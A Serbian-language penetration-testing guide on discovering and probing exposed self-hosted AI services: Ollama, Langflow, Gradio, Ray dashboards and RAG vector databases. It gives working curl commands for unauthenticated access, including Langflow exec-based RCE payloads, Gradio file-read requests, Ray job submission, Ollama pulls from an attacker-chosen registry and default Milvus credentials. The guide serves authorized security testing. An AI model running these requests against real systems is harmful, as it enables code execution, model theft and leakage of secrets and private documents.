# Izloženi samostalno hostovani AI servisi

{{#include ../banners/hacktricks-training.md}}

Timovi koji razvijaju AI funkcije često pokreću sopstvene izvršioce modela, alate za izradu agenata, demo interfejse, računarske klastere i vektorske baze podataka. Mnogi od ovih alata namenjeni su za laptop ili zatvorenu laboratorijsku mrežu, pa **podrazumevano nemaju autentifikaciju** ili se isporučuju sa omogućenom prečicom za autentifikaciju. Kada napadač može da pristupi takvom servisu, posledice obično spadaju u jednu od sledećih grupa:

- Besplatno korišćenje GPU-ova i modela, kao i krađa privatnih modela.
- Curenje promptova, dokumenata i embedding-a.
- Curenje tajni iz okruženja procesa (ključevi LLM provajdera, cloud akreditivi).
- Izvršavanje koda, jer neki od ovih API-ja izvršavaju kod **kao funkciju**.

Ova stranica opisuje kako pronaći ove servise i šta proveriti za svaki tip API-ja. Za ojačavanje bezbednosti samostalno hostovanog inference servera i curenje u llama.cpp `/slots`, pogledajte [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening). Za zlonamerne fajlove modela pogledajte [AI Models RCE](AI-Models-RCE.md).

## Otkrivanje tehnologije

Šaljite ove zahteve bez akreditiva. JSON odgovor sa očekivanim poljima identifikuje proizvod, a često i verziju, što pokazuje koje od provera u nastavku treba primeniti. Portovi su dokumentovane podrazumevane vrednosti ili portovi koji se koriste u zvaničnim primerima za pokretanje.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Proizvod | Uobičajeni port | Neautentifikovani zahtev | Šta ga identifikuje |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | JSON sa verzijom, lista lokalnih modela |
| Langflow | 7860 | `GET /api/v1/version` | JSON sa verzijom Langflow-a |
| Gradio | 7860 | `GET /config` | Konfiguracija aplikacije sa verzijom Gradio-a i ID-jevima komponenti |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, lista poslatih poslova |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Vrednost heartbeat-a, verzija Chroma-e |
| Qdrant | 6333 | `GET /`, `GET /collections` | Verzija Qdrant-a, lista kolekcija |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Verzija Weaviate-a, klase |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Lista kolekcija ili greška autentifikacije |

Ovi servisi se često objavljuju i iza reverse proxy-ja, pod prefiksom putanje (na primer `/ollama/` ili `/ray/`), pa ponovite zahteve sa svim prefiksima pronađenim u JavaScript paketima ili dokumentaciji API-ja.

## Neautentifikovani API-ji za inference i upravljanje modelima

Izvršioci modela obično izlažu jedan REST API koji kombinuje rute za inference sa administrativnim rutama. Ollama je dobar primer. Nema ugrađenu autentifikaciju i podrazumevano se vezuje za `127.0.0.1:11434`, dok `OLLAMA_HOST` menja adresu za vezivanje.<sup>[[1]](#references)[[15]](#references)</sup> Zvanična Docker slika postavlja `OLLAMA_HOST=0.0.0.0:11434` unutar kontejnera, deklariše `EXPOSE 11434` i nema instrukciju `USER`, pa server u kontejneru radi kao root.<sup>[[16]](#references)</sup> `EXPOSE` ne objavljuje port na hostu, pa dostupnost sa hosta zavisi od implementacije. Dokumentovane komande `docker run` koriste `-p 11434:11434`, a Docker objavljuje takvo mapiranje na svim mrežnim interfejsima hosta, osim ako nije navedena IP adresa hosta.<sup>[[17]](#references)[[18]](#references)</sup>

Šta napadač može da postigne preko svake grupe ruta:<sup>[[2]](#references)</sup>

| Rute | Posledice kada nema autentifikacije |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Lista lokalnih i učitanih modela, uključujući privatne prilagođene modele |
| `POST /api/show` | Detalji modela, uključujući Modelfile, template i **sistemski prompt** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Besplatan inference na hardveru žrtve |
| `POST /api/pull`, `/api/push` | Naterati server da preuzme model iz registra koji je izabrao napadač ili da mu otpremi model |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Kreiranje, prepisivanje ili brisanje modela |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Lista modela vraćena bez akreditiva već dokazuje izloženost. Prilagođeni modeli često sadrže interni system prompt dostupan preko `/api/show`. Pull ka vašem hostu dokazuje da server preuzima manifeste iz registara koje je izabrao napadač. `/api/push` ka vašem registru pretvara izloženost u krađu modela. Nemojte pozivati rute za kreiranje ili brisanje na stvarnim ciljevima.

Pull-ovi iz registara predstavljaju i površinu za napad na parser, jer server skladišti blob-ove koristeći vrednosti iz udaljenog manifesta. U slučaju Probllama (CVE-2024-37032, ispravljeno u Ollama 0.1.34), manifest `digest` korišćen je kao ime datoteke bez validacije. Zlonamerni registar je zato mogao da upisuje datoteke izvan direktorijuma za blob-ove pomoću nizova `../`. Slanjem pripremljenog manifesta čiji je digest upućivao na lokalnu datoteku, ta datoteka je leakovana u registar napadača. Wiz je postigao RCE u Docker-u, gde server radi kao root, tako što je upisao deljenu biblioteku i dodao je u `/etc/ld.so.preload`, a zatim pozvao `/api/chat` kako bi novi proces učitao biblioteku.<sup>[[15]](#references)</sup> Kada runner može da preuzima sadržaj iz proizvoljnih registara, proverite kako pretvara polja manifesta u putanje.

## API-ji koji su osmišljeni da izvršavaju kod

### API-ji za slanje poslova

Okviri za distribuirano računanje tretiraju izvršavanje koda kao svoju glavnu funkciju. Ray Jobs API na portu za dashboard (8265) prihvata shell komandu `entrypoint` i pokreće je na klasteru.<sup>[[19]](#references)</sup> Istraživanje Oligo ShadowRay navodi da Jobs API nema autorizaciju i da se dashboard vezuje za `0.0.0.0`. Povezani CVE-2023-48022 je sporan jer se očekuje da Ray radi samo unutar kontrolisane mreže.<sup>[[20]](#references)</sup> Ray je u verziji 2.52.0 dodao opcionalnu autentifikaciju tokenom (`RAY_AUTH_MODE=token`). Ray 2.59 je podrazumevano omogućava za lokalne klastere pokrenute pomoću `ray.init()`; `ray start --head` i dalje može da se pokrene bez autentifikacije ako nijedan token nije dostupan. Ray dokumentuje šire uvođenje podrazumevane autentifikacije u verziji 2.61, zato proverite instaliranu verziju i način pokretanja, umesto da pretpostavite da je dashboard otvoren.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Kontrolne table ove vrste imaju i pomoćne rute koje vredi ispitati u starijim verzijama. Pre Ray 2.8.1, `/log_proxy?url=` preuzimao je bilo koji HTTP(S) URL (SSRF do metapodataka u cloudu), a `/api/v0/logs/file` prihvatao je proizvoljnu putanju `filename` — oba bez autentifikacije.<sup>[[8]](#references)</sup>

### Krajnje tačke za „validaciju“ koda koje izvršavaju definicije funkcija

Alati za izradu agenata koji prihvataju prilagođene Python komponente ponekad „validiraju“ kod tako što ga parsiraju pomoću `ast` i izvršavaju samo definicije funkcija pomoću `exec()`. To nije bezbedno. Python evaluira **dekoratore i podrazumevane vrednosti argumenata prilikom definisanja funkcije**, pa se kod postavljen tamo izvršava čak i ako se telo funkcije nikad ne izvrši. `POST /api/v1/validate/code` u Langflow-u radio je na ovaj način i nije zahtevao autentifikaciju pre verzije 1.3.0 (CVE-2025-3248). Podizanje izuzetka koji sadrži izlaz komande navodi krajnju tačku da vrati taj izlaz u odgovoru:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Testirajte svaki endpoint koji kompajlira, lintuje ili „proverava” korisnički kod zbog ovog obrasca, a kao dokaz prednost dajte DNS callback-u.

### Auto-login i podrazumevane rute za superuser tokene

Alati za jednog korisnika često imaju prečicu koja svakog posetioca prijavljuje kao administratora. U Langflow-u, kada je `AUTO_LOGIN` omogućen, `GET /api/v1/auto_login` vraća tokene podrazumevanog superuser-a bilo kom pozivaocu. Kada je onemogućen, ruta odgovara porukom `Auto login is disabled.`.<sup>[[23]](#references)</sup> Langflow OSS 1.0.0 do 1.10.0 ga je podrazumevano imao omogućenog (CVE-2026-9103). Njegovim povezivanjem sa prethodno pomenutom rutom za validaciju koda uz autentifikaciju ponovo se omogućava neautentifikovani RCE (CVE-2026-9198, prijavio Harish Kolla).<sup>[[24]](#references)[[25]](#references)[[33]](#references)</sup> Trenutni zvanični paketi izdanja i Docker slike onemogućavaju automatsku prijavu i zahtevaju superuser lozinku, ali razvojne grane je i dalje imaju omogućenu.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Čak i bez izvršavanja koda, superuser token omogućava pristup svim tokovima i sačuvanim kredencijalima provajdera. Za povezanu proveru preduslova u automatizovanom testiranju pogledajte [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## Rute za posluživanje datoteka i RPC u ML demo interfejsima

ML demo okviri poslužuju otpremljene i generisane datoteke putem generičke rute i omogućavaju frontend-u da poziva pomoćne funkcije komponenti na serveru. Gradio za to izlaže `/config`, `/upload` i `/file=<path>`.<sup>[[5]](#references)</sup> Dva obrasca vredi testirati na svakom sličnom okviru:

- **Traversal iz poddirektorijuma za otpremanje:** ako ruta za datoteke proverava samo da li putanja počinje unutar privremene fascikle, otpremite datoteku da biste kreirali poddirektorijum, pa izađite iz njega pomoću `../` ili `%2e%2e%2f`. Gradio 4.0–4.10 (CVE-2023-51449) bio je ranjiv na ovaj način.<sup>[[26]](#references)[[27]](#references)</sup> Pošaljite zahtev pomoću `curl --path-as-is` kako klijent ne bi normalizovao putanju.
- **Arbitrarno pozivanje metoda:** krajnja tačka koja poziva `getattr(component, fn_name)` sa korisničkim unosom omogućava napadaču da poziva interne pomoćne funkcije. Pre verzije 4.13.0, Gradio-ova ruta `/component_server` radila je upravo to. U verzijama 4.3–4.12, `move_resource_to_block_cache` je kopirala bilo koju lokalnu datoteku u keš, odakle se mogla preuzeti preko `/file=`. U verzijama 3.47–3.50.2, druge pomoćne funkcije omogućavale su čitanje datoteka i SSRF sa čitanjem celog sadržaja.<sup>[[26]](#references)[[28]](#references)</sup> Ispravljeni server odgovara sa `Function not found.` za pomoćne funkcije koje nisu označene kao serverske funkcije.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

Na Hugging Face Spaces, tajne za Space predstavljaju promenljive okruženja, pa je `/proc/self/environ` najvrednija datoteka. Horizon3 ju je pročitao pomoću HTTP `Range` zaglavlja.<sup>[[26]](#references)</sup>

## Vektorske baze podataka koje koristi RAG

RAG čuva delove originalnih dokumenata, njihove embeddings i metapodatke u vektorskoj bazi podataka, a asistent u svoj prompt ubacuje najbolje rezultate. Pristup za čitanje zato otkriva **običan tekst privatnih dokumenata**. Pristup za upis omogućava napadaču da ubaci delove koji se kasnije preuzimaju u promptove drugih korisnika, što predstavlja trajnu indirektnu prompt injection (pogledajte [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

Kod samostalno hostovanih vektorskih baza podataka proverite da li je podešena autentifikacija ili omogućen anonimni pristup:

- **Qdrant**: samostalno postavljene instance slušaju na svim interfejsima bez autentifikacije. Kada je podešen, ključ se prosleđuje u zaglavlju `api-key` ili kao `Authorization: Bearer`. Mogu postojati ključevi samo za čitanje i ključevi ograničeni na pojedinačne kolekcije.<sup>[[11]](#references)</sup>
- **Chroma**: autentifikacija je podrazumevano onemogućena. Token auth koristi `Authorization` ili `X-Chroma-Token`.<sup>[[29]](#references)</sup>
- **Weaviate**: zahtevi bez akreditiva autentifikuju se kao `user: anonymous` kada je omogućen anonimni pristup i dobijaju sve dozvole koje taj korisnik ima.<sup>[[30]](#references)</sup>
- **Milvus**: autentifikacija je isključena osim ako je `common.security.authorizationEnabled` postavljeno na `true`. Kada je uključena, podrazumevani korisnik `root` ima lozinku `Milvus`, a format tokena je `username:password`.<sup>[[31]](#references)[[14]](#references)</sup>

Odgovor koji sadrži privatne podatke bez akreditiva ukazuje na izloženost. Kada je autentifikacija uključena, zasebno proverite da li postoji nepromenjen podrazumevani nalog:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Proverite da li payloads sadrže tekst dokumenta, identifikatore korisnika ili nazive tenant-a. Da biste pokazali da imate pristup za upisivanje, a da ne zagađujete produkcione podatke, kreirajte i odmah obrišite praznu kolekciju sa jasno prepoznatljivim nazivom, i to samo kada je to dozvoljeno u okviru opsega.

Autentifikacija na ovim serverima može da se izvrši i prekasno. U Chroma Python FastAPI serveru (od verzije 1.0.0 do najmanje 1.5.8, CVE-2026-45829), ruta za kreiranje kolekcije konstruisala je embedding funkciju koju je dostavio klijent pre provere autentifikacije. Konfiguracija koja je upućivala na Hugging Face model pod kontrolom napadača, uz `trust_remote_code: true`, pokrenula je kod napadača čak i kada je zahtev odbijen. Rust frontend nije bio pogođen.<sup>[[32]](#references)</sup> Kada zahtev sadrži konfiguraciju modela ili dodatka, testirajte ga bez akreditiva i pratite da li dolazi do odlaznog preuzimanja sa vašeg repozitorijuma modela.

## References

- [1] [Ollama FAQ](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Ollama API dokumentacija](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [Langflow README](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Langflow izvorni kod - API v1 krajnje tačke](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Gradio izvorni kod - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Gradio izvorni kod - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Ray izvorni kod - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray, verzije 2.6.3, 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Chroma izvorni kod - podrazumevane vrednosti Python klijenta](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Chroma izvorni kod - FastAPI serverske rute](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - Bezbednost](https://qdrant.tech/documentation/security/)
- [12] [Qdrant OpenAPI specifikacija](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Weaviate OpenAPI specifikacija](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Povezivanje sa Milvus serverom](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: ranjivost Ollama za udaljeno izvršavanje koda (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Ollama Dockerfile](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Ollama Docker dokumentacija](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - Objavljivanje i izlaganje portova](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [Ray Jobs REST API](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: prva poznata kampanja napada usmerena na AI radna opterećenja, iskorišćena u stvarnom svetu](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Ray autentifikacija tokenom](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - Nesigurno pri bilo kojoj brzini: zloupotreba Python exec za neautentifikovani RCE u Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Langflow izvorni kod - login router](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Iskorišćavanje ranjivosti za čitanje datoteka u Gradio-u radi krađe tajni iz Hugging Face Spaces](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Gradio bezbednosno obaveštenje GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Gradio ispravka za `/component_server`](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Chroma-native autentifikacija](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - Autentifikacija](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - Autentifikacija korisničkog pristupa](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast poslužen pre autentifikacije](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
- [33] [IBM Security Bulletin - Neautentifikovano udaljeno izvršavanje koda preko zaobilaženja automatske prijave i validacije koda (CVE-2026-9198)](https://www.ibm.com/support/pages/node/7278927)
{{#include ../banners/hacktricks-training.md}}
